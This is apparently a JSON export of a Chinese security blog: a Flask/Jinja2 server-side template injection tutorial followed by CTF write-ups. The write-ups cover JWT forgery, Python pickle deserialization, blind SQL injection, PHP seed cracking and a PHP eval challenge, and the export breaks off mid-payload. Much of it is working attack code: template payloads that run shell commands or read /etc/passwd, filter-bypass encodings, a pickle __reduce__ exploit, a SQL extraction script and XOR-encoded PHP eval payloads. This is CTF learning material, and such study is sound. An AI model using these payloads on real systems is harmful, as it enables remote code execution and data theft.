[{"title":"flask","date":"2021-02-08T07:13:40.000Z","path":"2021/02/08/flask/","text":"flask框架类型的题目，在最近几次的比赛中经常出现，但是每次出现都会让人苦不堪言，因为实在是不了解该类型的题目，所以有必要花时间总结一下该类型题目的套路 0x1 基础知识从Flask的模板引擎Jinja2入手，CTF中大多数也都是使用这种模板引擎 模板的基本语法官方文档对于模板的语法介绍如下 1234567&#123;% ... %&#125; for Statements&#123;&#123; ... &#125;&#125; for Expressions to print to the template output&#123;# ... #&#125; for Comments not included in the template output# ... ## for Line Statements 常见的魔术方法 __class__ 用于返回对象所属的类 1234567Python 3.7.8&gt;&gt;&gt; &#x27;&#x27;.__class__&lt;class &#x27;str&#x27;&gt;&gt;&gt;&gt; ().__class__&lt;class &#x27;tuple&#x27;&gt;&gt;&gt;&gt; [].__class__&lt;class &#x27;list&#x27;&gt; __base__ 以字符串的形式返回一个类所继承的类 __bases__ 以元组的形式返回一个类所继承的类 __mro__ 获取类的所有子类 __init__ 所有自带带类都包含init方法，常用他当跳板来调用globals __globals__ 会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合init使用 漏洞成因存在模板注入漏洞原因有二，一是存在用户输入变量可控，二是了使用不固定的模板，这里简单给出一个存在SSTI的代码如下 1234567891011121314151617181920from flask import Flask,request,render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): name = request.args.get(&#x27;name&#x27;) template = &#x27;&#x27;&#x27;&lt;html&gt; &lt;head&gt; &lt;title&gt;SSTI&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;Hello, %s !&lt;/h3&gt; &lt;/body&gt;&lt;/html&gt; &#x27;&#x27;&#x27;% (name) return render_template_string(template)if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) 提交参数name=&#123;&#123;2-1&#125;&#125;，会显示1，这也是测试ssti的一种常用的方法 下图是常用的测试方法和对应的模板类型 0x2 构造链思路这里从零开始介绍如何去构造SSTI漏洞的payload，可以用上面存在SSTI漏洞的ssti.py做实验 第一步 目的：使用__class__来获取内置类所对应的类 可以通过使用str，list，tuple，dict等来获取 123456789101112Python 3.7.8&gt;&gt;&gt; &#x27;&#x27;.__class__&lt;class &#x27;str&#x27;&gt;&gt;&gt;&gt; &quot;&quot;.__class__&lt;class &#x27;str&#x27;&gt;&gt;&gt;&gt; [].__class__&lt;class &#x27;list&#x27;&gt;&gt;&gt;&gt; ().__class__&lt;class &#x27;tuple&#x27;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;class &#x27;dict&#x27;&gt; 第二步 目的：拿到object基类 用__bases__[0]拿到基类 123Python 3.7.8&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0]&lt;class &#x27;object&#x27;&gt; 用__base__拿到基类 123Python 3.7.8&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__&lt;class &#x27;object&#x27;&gt; 用__mro__[1]或者__mro__[-1]拿到基类 12345Python 3.7.8&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[1]&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1]&lt;class &#x27;object&#x27;&gt; 第三步 用__subclasses__()拿到子类列表 123Python 3.7.8&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()...一大堆的子类 第四步 在子类列表中找到可以getshell的类 然后直接调用里面的方法即可，payload如下 读文件payload123&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).readlines()&#125;&#125; 命令执行构造在双大括号我们可以执行表达式,但是命名空间是受限的,没有builtins,所以eval,open这些操作是不能使用的,但根据前面的知识,我们可以通过任意一个函数的func_globals而得到他们的命名空间,而得到builtins flask内置函数这种方法之前好像没人提过 Flask 内置了两个函数url_for 和 get_flashed_messages,还有一些内置的对象 12&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;].__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&#125;&#125;&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()&#125;&#125; 如果过滤了config,又需要查config 12&#123;&#123;config&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125; 通过基类查找子类虽然模块间的变量不共享,但是所有类都是object的子类,所以可以通过object类而得到其他类 利用 1234567891011121314151617#python2.7&#x27;&#x27;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]#python3.7&#x27;&#x27;.__class__.__mro__[1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0][].__class__.__base__().__class__.__base__&#123;&#125;.__class__.__base__request.__class__.__mro__[1]session.__class__.__mro__[1]redirect.__class__.__mro__[1] 等得到object 对象,然后通过__subclasses__()方法,得到所有子类,在找重载过__inti__,__repr__等特殊方法的类,利用这些方法的__globals__得到,__builtins__,或者os,codecs等可以进行代码执行的调用. 常见payload 12// 59 为warnings.WarningMessag&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;) 不使用globals的payload 1234// &lt;class &#x27;warnings.catch_warnings&#x27;&gt;类在在内部定义了_module=sys.modules[&#x27;warnings&#x27;]，然后warnings模块包含有__builtins__,如果可以找到warnings.catch_warnings类,则可以不使用 globals&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[60]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;calc&quot;) 0x3 过滤绕过前置知识 利用python的魔术方法,也可以实现字典,数组取值等操作 Jinja2对模板做了特殊处理,所以通过 1A[&#x27;__init__&#x27;] 也可以访问A的方法,属性 Jinja2 的attr 过滤器可以获得对象的属性或方法 flask内置的request对象可以得到请求的信息 12345request.args.namerequest.cookies.namerequest.headers.namerequest.values.namerequest.form.name 关键字过滤没过滤引号 如果没用过滤引号,使用反转,或者各种拼接绕过 123&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__[&#x27;__snitliub__&#x27;[::-1]][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)&#125;&#125;&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;[::-1]][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)&#125;&#125; 过滤了引号 利用将需要的变量放在请求中,然后通过[],或者通过attr,__getattribute__获得 12345// url?a=eval&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.[request.args.a](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)// Cookie: aa=__class__;bb=__mro__;cc=__subclasses__&#123;&#123;((request|attr(request.cookies.get(&#x27;aa&#x27;))|attr(request.cookies.get(&#x27;bb&#x27;))|list).pop(-1))|attr(request.cookies.get(&#x27;cc&#x27;))()&#125;&#125; 如果request被ban,可以考虑通过 1&#123;&#123;(config.__str__()[2])+(config.__str__()[3])&#125;&#125; 拼接需要的字符 查出chr函数,利用set赋值,然后使用 1&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; 利用内置过滤器拼接出,’%c’,再利用’’%语法得到任意字符 1234567891011121314151617get %找到特殊字符&lt;,url编码,得到%&#123;%set pc = g|lower|list|first|urlencode|first%&#125;get &#x27;c&#x27;&#123;%set c=dict(c=1).keys()|reverse|first%&#125;字符串拼接&#123;%set udl=dict(a=pc,c=c).values()|join %&#125;可以得到任意字符了get _&#123;%set udl2=udl%(95)%&#125;&#123;&#123;udl&#125;&#125; 特殊字符过滤其他奇奇怪怪的过滤,善用Flask/Jinja2的文档,用内置过滤器,函数,变量,魔术方法等绕过 如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过 如果直接ban了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下 拼接字符绕过 这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用+号或者不用 12&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0]&#125;&#125;&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;].__bases__[0]&#125;&#125; 随便写个payload如下 1&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;&#x27;al&#x27;](&quot;__im&quot;&quot;port__(&#x27;o&#x27;&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125; 或者可以使用join来进行拼接 1&#123;&#123;()|attr([&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2]|join)&#125;&#125; 使用使用str原生函数 replace绕过，payload如下 12&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;复制代码 decode绕过，但这种方法经过测试只能在python2下使用，payload如下 12&#123;&#123;().__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;复制代码 替代的方法 过滤init，可以用__enter__或__exit__替代 1234&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;复制代码 过滤config，如果被过滤了可以使用以下的payload绕过 12&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125; 过滤 [可以使用__getitem__和pop替代中括号，取列表的第n位 123456789#getitem、pop&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read()&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;__import__&#x27;)(&#x27;os&#x27;).system(&#x27;calc&#x27;)&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen(&#x27;whoami&#x27;).read()&#125;&#123;&#123;().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen(&#x27;whoami&#x27;).read()&#125;&#125; 过滤双花括号123456#用&#123;%%&#125;标记&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;这样会没有回显,考虑带外或者盲注# 用&#123;%print%&#125;标记,有回显&#123;%print config%&#125; 过滤下划线和过滤字符串一样绕过即可 或编码绕过 使用十六进制编码绕过，_编码后为\\x5f，.编码后为\\x2E 0x4 实战例子过滤_和.和&#39;这里顺便给一个不常见的方法，主要是找到_frozen_importlib_external.FileLoader的get_data()方法，第一个是参数0，第二个为要读取的文件名，payload如下 12&#123;&#123;().__class__.__bases__[0].__subclasses__()[222].get_data(0,&quot;app.py&quot;)&#125;&#125;复制代码 使用十六进制绕过后，payload如下 12&#123;&#123;()[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5F\\x5Fbases\\x5F\\x5F&quot;][0][&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[222][&quot;get\\x5Fdata&quot;](0, &quot;app\\x2Epy&quot;)&#125;&#125;复制代码 过滤args和.和_之前安恒二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了attr()绕过点，values绕过args，payload如下 1234&#123;&#123;()|attr(request[&#x27;values&#x27;][&#x27;x1&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x2&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x3&#x27;])()|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(40)|attr(request[&#x27;values&#x27;][&#x27;x5&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x6&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x7&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x8&#x27;])(request[&#x27;values&#x27;][&#x27;x9&#x27;])&#125;&#125;post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;whoami&#x27;).read()复制代码 导入主函数读取变量有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把/flag文件加载到flag这个变量里面了 12f = open(&#x27;/flag&#x27;,&#x27;r&#x27;)flag = f.read() 我们就可以通过import是导入__main__主函数去读变量，payload如下 1&#123;%print request.application.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;__import__&#x27;)(&#x27;__main__&#x27;).flag %&#125; base64编码对关键字进行base64编码可绕过一些明文检测机制： 1234567&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64encode(&#x27;__import__&#x27;)&#x27;X19pbXBvcnRfXw==&#x27;&gt;&gt;&gt; base64.b64encode(&#x27;os&#x27;)&#x27;b3M=&#x27;&gt;&gt;&gt; __builtins__.__dict__[&#x27;X19pbXBvcnRfXw==&#x27;.decode(&#x27;base64&#x27;)](&#x27;b3M=&#x27;.decode(&#x27;base64&#x27;)).system(&#x27;calc&#x27;)0 过滤了 &#39;, “, [, ], _, 双花括号,args, values过滤了单双引号导致调用函数时不能直接使用字符串常量，但是可以使用变量传值，比如cookies或者 headers(不能使用get或方法ost)，过滤下划线可以使用管道符外加调用attr()方法来绕过。 payload 123456789url?args=&#123;%print((()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)(request.cookies.g))(request.cookies.h).read())%&#125;Cookie: h=catf*;a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals__;g=popen 过滤了&#39;, “, [, ], _, 双花括号,values与上面类似 payload 123url?args=&#123;%print((()|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(132)|attr(request.args.e)|attr(request.args.f)|attr(request.args.d)(request.args.g))(request.args.h).read())%&#125;&amp;h=catf*&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen 过滤了&#39;, “, [, ], _, 双花括号,args使用post方法 12url?args=&#123;%print((()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g))(request.values.h).read())%&#125;POST:h=cat f*&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen 参考连接： https://xz.aliyun.com/t/5399 细说Jinja2之SSTI&amp;bypass","tags":[]},{"title":"winter_homework","date":"2021-02-03T13:49:09.000Z","path":"2021/02/03/winter-homework/","text":"在家还是要学习 [CISCN2019 华北赛区 Day1 Web2]ikun进入题目，发现不简单，又在黑我kunkun 0x1 lv6看到第一个提示需要买到 lv6，但是第一页没发现Iv6，往后翻了几页还是没发现，不如写个脚本跑出来 12345678import requestsurl=&quot;http://6e7db183-764d-4afc-bdbb-b70791536e4a.node3.buuoj.cn/shop?page=&quot;for i in range(0,2000): r=requests.get(url+str(i)) if &#x27;lv6.png&#x27; in r.text: print (i) break lv6在181页，买的时候会发现，钱不够，但是可以抓包修改折扣，买完之后会重定向一次，但是此时会出现302，提示只有admin才能访问该页面 0x2 伪造admin我们知道网页身份确定一般都是基于cookie的，因此只需要伪造出admin登录时使用的cookie即可。 抓包可以看到，此题的cookie是由JWT决定的（JWT介绍） https://jwt.io/ 将上面的JWT值放到上面的网站中可以看到 下面要做的就是伪造JWT，将username 的值换成admin 但是我们需要知道构造JWT使用的密码，使用工具（https://github.com/brendan-rius/c-jwt-cracker） 得到密码后就可以伪造出admin使用的cookie 得到cookie后使用浏览器中的cookie编辑插件，将其中的JWT换成构造好的JWT，这样就是以admin身份登录 在个人中心发现另外一个hint 查看源码后，发现了www.zip源码包 0x3 python 反序列化在admin.py中发现了可反序列化的点 python反序列化以前没有遇到过 123456789pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。 pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，pickle序列化后的数据，可读性差，人一般无法识别。p = pickle.loads(urllib.unquote(become))urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回 首先构建一个类，类里面的\\reduce__python魔术方法会在该类被反序列化的时候会被调用 在\\reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码 1234567891011121314151617181920212223242526272829303132333435363738Pickle模块中最常用的函数为：（1）pickle.dump(obj, file, [,protocol]) 函数的功能：将obj对象序列化存入已经打开的file中。 参数讲解： obj：想要序列化的obj对象。 file:文件名称。 protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。（2）pickle.load(file) 函数的功能：将file中的对象序列化读出。 参数讲解： file：文件名称。（3）pickle.dumps(obj[, protocol]) 函数的功能：将obj对象序列化为string形式，而不是存入文件中。 参数讲解： obj：想要序列化的obj对象。 protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。（4）pickle.loads(string) 函数的功能：从string中读出序列化前的obj对象。 参数讲解： string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。 exp: 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print(a) 将得到的内容提交给become参数 连接为 1http://a12f4ef4-c68f-40c7-afa3-09358de17dbf.node3.buuoj.cn/b1g_m4mber 参考 https://www.cnblogs.com/Cl0ud/p/12177062.html https://www.cnblogs.com/wangtanzhi/p/12178311.html [WUSTCTF2020]颜值成绩查询看到题目是输入框形式，猜测可能是注入，测试可以发现是盲注 并且查询成功时返回Hi admin, your score is: 100 接下来就是编写脚本一步一步拿到flag 使用?stunum=1 and (ascii(substr(database(),1,1))&gt;57,1,0)时，却提示查询失败，说明存在waf 猜测可能是将空格，and，or等关键词过滤 经查询发现有两张表 flag，score flag表中有两个字段 flag，value 其中value中存放着flag 完整脚本 1234567891011121314151617181920212223242526272829303132# 二分注入# -*- coding = utf - 8 -*-#@Time : 2021/2/4 22:37#@Author : sunzy#@File : 颜值成绩查询.pyimport requestsurl = &quot;http://1bbc4849-b601-4cf6-9db5-c19d30e5bbad.node3.buuoj.cn/?stunum=&quot;flag = &quot;&quot;t = &quot;&quot;sum=0for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;if((select/**/ascii(substring(group_concat(table_name),&#123;0&#125;,1))/**/as/**/a/**/from/**/information_schema.tables/**/where/**/ table_schema=database()/**/having/**/a&gt;&#123;1&#125;),1,0)&quot;.format(i,mid) payload = &quot;if((select/**/ascii(substring(group_concat(column_name),&#123;0&#125;,1))/**/as/**/a/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;flag&#x27;/**/having/**/a&gt;&#123;1&#125;),1,0)&quot;.format(i,mid) payload = &quot;if((select/**/ascii(substring(group_concat(value),&#123;0&#125;,1))/**/as/**/a/**/from/**/flag/**/having/**/a&gt;&#123;1&#125;),1,0)&quot;.format(i,mid) response = requests.get(url+payload) t = response.text if &quot;Hi admin, your score is: 100&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 # print(mid) flag = flag + chr(mid) print(flag)print(flag) [GWCTF 2019]枯燥的抽奖查看源码看到check.php 访问后看到了题目源码 12345678910111213141516171819202122232425262728&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#x27;seed&#x27;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#x27;num&#x27;]))&#123; if($_POST[&#x27;num&#x27;]===$str)&#123;x echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;; &#125; else&#123; echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;; &#125;&#125;show_source(&quot;check.php&quot;); 可以看到seed是伪随机生成的，网上搜了一下存在很多这样的文章（这里） 先将伪随机数转换为php_mt_seed可以识别的数据 1234567891011str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;str2=&#x27;TxSQvagG71&#x27;str3 = str1[::-1]length = len(str2)res=&#x27;&#x27;for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+&#x27; &#x27;+str(j)+&#x27; &#x27;+&#x27;0&#x27;+&#x27; &#x27;+str(len(str1)-1)+&#x27; &#x27; breakprint(res) 使用工具php_mt_seed 将下载好的文件放入kali中后，在该文件夹下使用make命令，即可生成可执行文件 再使用题目中的源码生成完整的字符串 123456789101112&lt;?phpmt_srand(93047411);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;echo $str;?&gt; 将得到的字符串提交后得到flag [CISCN2019 华东南赛区]Web11进入页面后，内容很多很杂，但是有点很引人注意，右上角的Ip 看到这个就想到了XXF头，抓包修改会发现随着改变 通过测试发现是模板注入 先列出目录之后再cat flag即可 这题没有什么过滤相对简单 [GYCTF2020]FlaskApp查看提示为 失败乃成功之母！！ 但是也不知道是什么意思 但是base64解密的页面解密错误格式的字符串出现报错，从而暴露出部分源码 0x1查看代码 首先获取我们输入的内容，之后进行base64解码，解码后通过waf检测则被执行，所以存在SSTI注入 0x2 读取源码1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 将上面的代码进行base64编码后提交解码，便可得到题目的源码，其中waf代码如下 12345def waf(str): black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 0x3 读取flag首先列出目录 1234&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;#IHt7JycuX19jbGFzc19fLl9fYmFzZXNfX1swXS5fX3N1YmNsYXNzZXNfXygpWzc1XS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJyl9fQ== 读取文件 使用python自带的切片省去了绕过flag的步骤 1234&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;txt.galf_eht_si_siht/&#x27;[::-1],&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9 [MRCTF2020]套娃0x1 第一关查看源码，看到注释中的源码 没见过 1$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; 上网查看一下 上面的代码的意思就是上传的参数中不能包括 _, %5f 但是可以使用 %5F，绕过 第二个if语句通过get取得的参数b_u_p_t不等于23333但是正则，匹配需要匹配到23333所以这里用%0a(因为正则匹配中’^’和’$’代表的是行的开头和结尾,所以能利用换行绕过)绕过 0x2 第二关访问上面的路劲，看到了js代码，放在控制台中运行，提示要POST Mrak 随便post数据即可获取源码 123456789101112131415161718192021222324252627&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; 代码审计 1.ip地址为127.0.0.1 2.file_get_contents获取的内容为 todat is a happy day 可以使用php input伪协议 3.file_get_contents(change($file)) 需要逆向change函数 很简单 12345678&lt;?php$v = &quot;flag.php&quot;;$re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; print base64_encode($re);?&gt; payload如图 [极客大挑战 2019]RCE ME123456789101112131415&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 很简单的代码 1.长度不能超过40 2.正则匹配中不能包含字母和数字 使用异或绕过或者取反绕过 12345异或$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo取反(~%8F%97%8F%96%91%99%90)(); 可以看到禁用了很多函数 构造shell用蚁剑连接 1234567891011121314&lt;?php error_reporting(0);$a=&#x27;assert&#x27;;$b=urlencode(~$a);echo $b;echo 